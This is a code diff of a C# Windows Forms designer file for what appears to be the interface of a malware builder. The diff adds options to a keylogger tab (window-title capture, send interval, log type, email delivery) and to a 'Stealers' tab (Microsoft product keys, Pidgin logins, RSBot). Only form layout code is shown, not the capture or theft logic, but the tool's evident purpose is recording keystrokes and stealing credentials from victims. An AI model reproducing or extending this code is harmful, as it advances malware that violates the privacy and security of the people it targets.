@@ -54,8 +54,15 @@
             this.textBoxKeyloggerEmailAddress = new System.Windows.Forms.TextBox();
             this.labelKeyloggerEmailFromName = new System.Windows.Forms.Label();
             this.tabPageStealer = new System.Windows.Forms.TabPage();
+            this.checkBoxStealersMicrosoftKeys = new System.Windows.Forms.CheckBox();
             this.checkBoxStealersRSBot = new System.Windows.Forms.CheckBox();
-            this.checkBoxStealersProductKey = new System.Windows.Forms.CheckBox();
+            this.checkBoxKeyloggerWindowTitles = new System.Windows.Forms.CheckBox();
+            this.numericUpDownKeyloggerInterval = new System.Windows.Forms.NumericUpDown();
+            this.labelKeyloggerInterval = new System.Windows.Forms.Label();
+            this.groupBoxLogType = new System.Windows.Forms.GroupBox();
+            this.radioButtonKeyloggerLogFull = new System.Windows.Forms.RadioButton();
+            this.radioButtonKeyloggerLogAlphaNumeric = new System.Windows.Forms.RadioButton();
+            this.checkBoxStealerPidgin = new System.Windows.Forms.CheckBox();
             this.menuStrip.SuspendLayout();
             this.tabControl.SuspendLayout();
             this.tabPageMain.SuspendLayout();
@@ -64,6 +71,8 @@
             this.groupBoxKeyloggerSend.SuspendLayout();
             this.groupBoxKeyloggerEmail.SuspendLayout();
             this.tabPageStealer.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownKeyloggerInterval)).BeginInit();
+            this.groupBoxLogType.SuspendLayout();
             this.SuspendLayout();
             // 
             // menuStrip
@@ -94,8 +103,9 @@
             // exitToolStripMenuItem
             // 
             this.exitToolStripMenuItem.Name = "exitToolStripMenuItem";
-            this.exitToolStripMenuItem.Size = new System.Drawing.Size(101, 22);
+            this.exitToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
             this.exitToolStripMenuItem.Text = "E&xit";
+            this.exitToolStripMenuItem.Click += new System.EventHandler(this.exitToolStripMenuItem_Click);
             // 
             // statusStrip
             // 
@@ -175,6 +185,10 @@
             // 
             // tabPageKeylogger
             // 
+            this.tabPageKeylogger.Controls.Add(this.groupBoxLogType);
+            this.tabPageKeylogger.Controls.Add(this.labelKeyloggerInterval);
+            this.tabPageKeylogger.Controls.Add(this.numericUpDownKeyloggerInterval);
+            this.tabPageKeylogger.Controls.Add(this.checkBoxKeyloggerWindowTitles);
             this.tabPageKeylogger.Controls.Add(this.groupBoxKeyloggerSend);
             this.tabPageKeylogger.Controls.Add(this.groupBoxKeyloggerEmail);
             this.tabPageKeylogger.Location = new System.Drawing.Point(4, 22);
@@ -319,7 +333,8 @@
             // 
             // tabPageStealer
             // 
-            this.tabPageStealer.Controls.Add(this.checkBoxStealersProductKey);
+            this.tabPageStealer.Controls.Add(this.checkBoxStealerPidgin);
+            this.tabPageStealer.Controls.Add(this.checkBoxStealersMicrosoftKeys);
             this.tabPageStealer.Controls.Add(this.checkBoxStealersRSBot);
             this.tabPageStealer.Location = new System.Drawing.Point(4, 22);
             this.tabPageStealer.Name = "tabPageStealer";
@@ -328,6 +343,16 @@
             this.tabPageStealer.TabIndex = 2;
             this.tabPageStealer.Text = "Stealers";
             this.tabPageStealer.UseVisualStyleBackColor = true;
+            // 
+            // checkBoxStealersMicrosoftKeys
+            // 
+            this.checkBoxStealersMicrosoftKeys.AutoSize = true;
+            this.checkBoxStealersMicrosoftKeys.Location = new System.Drawing.Point(8, 29);
+            this.checkBoxStealersMicrosoftKeys.Name = "checkBoxStealersMicrosoftKeys";
+            this.checkBoxStealersMicrosoftKeys.Size = new System.Drawing.Size(95, 17);
+            this.checkBoxStealersMicrosoftKeys.TabIndex = 1;
+            this.checkBoxStealersMicrosoftKeys.Text = "Microsoft Keys";
+            this.checkBoxStealersMicrosoftKeys.UseVisualStyleBackColor = true;
             // 
             // checkBoxStealersRSBot
             // 
@@ -339,15 +364,89 @@
             this.checkBoxStealersRSBot.Text = "RSBot";
             this.checkBoxStealersRSBot.UseVisualStyleBackColor = true;
             // 
-            // checkBoxStealersProductKey
+            // checkBoxKeyloggerWindowTitles
             // 
-            this.checkBoxStealersProductKey.AutoSize = true;
-            this.checkBoxStealersProductKey.Location = new System.Drawing.Point(8, 29);
-            this.checkBoxStealersProductKey.Name = "checkBoxStealersProductKey";
-            this.checkBoxStealersProductKey.Size = new System.Drawing.Size(89, 17);
-            this.checkBoxStealersProductKey.TabIndex = 1;
-            this.checkBoxStealersProductKey.Text = "Product Keys";
-            this.checkBoxStealersProductKey.UseVisualStyleBackColor = true;
+            this.checkBoxKeyloggerWindowTitles.AutoSize = true;
+            this.checkBoxKeyloggerWindowTitles.Location = new System.Drawing.Point(214, 15);
+            this.checkBoxKeyloggerWindowTitles.Name = "checkBoxKeyloggerWindowTitles";
+            this.checkBoxKeyloggerWindowTitles.Size = new System.Drawing.Size(131, 17);
+            this.checkBoxKeyloggerWindowTitles.TabIndex = 2;
+            this.checkBoxKeyloggerWindowTitles.Text = "Include Window Titles";
+            this.checkBoxKeyloggerWindowTitles.UseVisualStyleBackColor = true;
+            // 
+            // numericUpDownKeyloggerInterval
+            // 
+            this.numericUpDownKeyloggerInterval.Location = new System.Drawing.Point(215, 34);
+            this.numericUpDownKeyloggerInterval.Maximum = new decimal(new int[] {
+            43200,
+            0,
+            0,
+            0});
+            this.numericUpDownKeyloggerInterval.Minimum = new decimal(new int[] {
+            1,
+            0,
+            0,
+            0});
+            this.numericUpDownKeyloggerInterval.Name = "numericUpDownKeyloggerInterval";
+            this.numericUpDownKeyloggerInterval.Size = new System.Drawing.Size(58, 20);
+            this.numericUpDownKeyloggerInterval.TabIndex = 3;
+            this.numericUpDownKeyloggerInterval.Value = new decimal(new int[] {
+            1,
+            0,
+            0,
+            0});
+            // 
+            // labelKeyloggerInterval
+            // 
+            this.labelKeyloggerInterval.AutoSize = true;
+            this.labelKeyloggerInterval.Location = new System.Drawing.Point(279, 36);
+            this.labelKeyloggerInterval.Name = "labelKeyloggerInterval";
+            this.labelKeyloggerInterval.Size = new System.Drawing.Size(93, 13);
+            this.labelKeyloggerInterval.TabIndex = 9;
+            this.labelKeyloggerInterval.Text = "Interval in Minutes";
+            // 
+            // groupBoxLogType
+            // 
+            this.groupBoxLogType.Controls.Add(this.radioButtonKeyloggerLogFull);
+            this.groupBoxLogType.Controls.Add(this.radioButtonKeyloggerLogAlphaNumeric);
+            this.groupBoxLogType.Location = new System.Drawing.Point(214, 61);
+            this.groupBoxLogType.Name = "groupBoxLogType";
+            this.groupBoxLogType.Size = new System.Drawing.Size(158, 49);
+            this.groupBoxLogType.TabIndex = 2;
+            this.groupBoxLogType.TabStop = false;
+            this.groupBoxLogType.Text = "Log Type";
+            // 
+            // radioButtonKeyloggerLogFull
+            // 
+            this.radioButtonKeyloggerLogFull.AutoSize = true;
+            this.radioButtonKeyloggerLogFull.Location = new System.Drawing.Point(103, 18);
+            this.radioButtonKeyloggerLogFull.Name = "radioButtonKeyloggerLogFull";
+            this.radioButtonKeyloggerLogFull.Size = new System.Drawing.Size(41, 17);
+            this.radioButtonKeyloggerLogFull.TabIndex = 1;
+            this.radioButtonKeyloggerLogFull.TabStop = true;
+            this.radioButtonKeyloggerLogFull.Text = "Full";
+            this.radioButtonKeyloggerLogFull.UseVisualStyleBackColor = true;
+            // 
+            // radioButtonKeyloggerLogAlphaNumeric
+            // 
+            this.radioButtonKeyloggerLogAlphaNumeric.AutoSize = true;
+            this.radioButtonKeyloggerLogAlphaNumeric.Location = new System.Drawing.Point(6, 19);
+            this.radioButtonKeyloggerLogAlphaNumeric.Name = "radioButtonKeyloggerLogAlphaNumeric";
+            this.radioButtonKeyloggerLogAlphaNumeric.Size = new System.Drawing.Size(91, 17);
+            this.radioButtonKeyloggerLogAlphaNumeric.TabIndex = 0;
+            this.radioButtonKeyloggerLogAlphaNumeric.TabStop = true;
+            this.radioButtonKeyloggerLogAlphaNumeric.Text = "AlphaNumeric";
+            this.radioButtonKeyloggerLogAlphaNumeric.UseVisualStyleBackColor = true;
+            // 
+            // checkBoxStealerPidgin
+            // 
+            this.checkBoxStealerPidgin.AutoSize = true;
+            this.checkBoxStealerPidgin.Location = new System.Drawing.Point(8, 52);
+            this.checkBoxStealerPidgin.Name = "checkBoxStealerPidgin";
+            this.checkBoxStealerPidgin.Size = new System.Drawing.Size(89, 17);
+            this.checkBoxStealerPidgin.TabIndex = 2;
+            this.checkBoxStealerPidgin.Text = "Pidgin Logins";
+            this.checkBoxStealerPidgin.UseVisualStyleBackColor = true;
             // 
             // MainForm
             // 
@@ -367,12 +466,16 @@
             this.groupBoxMainType.ResumeLayout(false);
             this.groupBoxMainType.PerformLayout();
             this.tabPageKeylogger.ResumeLayout(false);
+            this.tabPageKeylogger.PerformLayout();
             this.groupBoxKeyloggerSend.ResumeLayout(false);
             this.groupBoxKeyloggerSend.PerformLayout();
             this.groupBoxKeyloggerEmail.ResumeLayout(false);
             this.groupBoxKeyloggerEmail.PerformLayout();
             this.tabPageStealer.ResumeLayout(false);
             this.tabPageStealer.PerformLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownKeyloggerInterval)).EndInit();
+            this.groupBoxLogType.ResumeLayout(false);
+            this.groupBoxLogType.PerformLayout();
             this.ResumeLayout(false);
             this.PerformLayout();
 
@@ -407,7 +510,14 @@
         private System.Windows.Forms.ComboBox comboBoxKeyloggerEmailServer;
         private System.Windows.Forms.Label labelKeyloggerEmailServer;
         private System.Windows.Forms.CheckBox checkBoxStealersRSBot;
-        private System.Windows.Forms.CheckBox checkBoxStealersProductKey;
+        private System.Windows.Forms.CheckBox checkBoxStealersMicrosoftKeys;
+        private System.Windows.Forms.GroupBox groupBoxLogType;
+        private System.Windows.Forms.RadioButton radioButtonKeyloggerLogFull;
+        private System.Windows.Forms.RadioButton radioButtonKeyloggerLogAlphaNumeric;
+        private System.Windows.Forms.Label labelKeyloggerInterval;
+        private System.Windows.Forms.NumericUpDown numericUpDownKeyloggerInterval;
+        private System.Windows.Forms.CheckBox checkBoxKeyloggerWindowTitles;
+        private System.Windows.Forms.CheckBox checkBoxStealerPidgin;
     }
 }
 
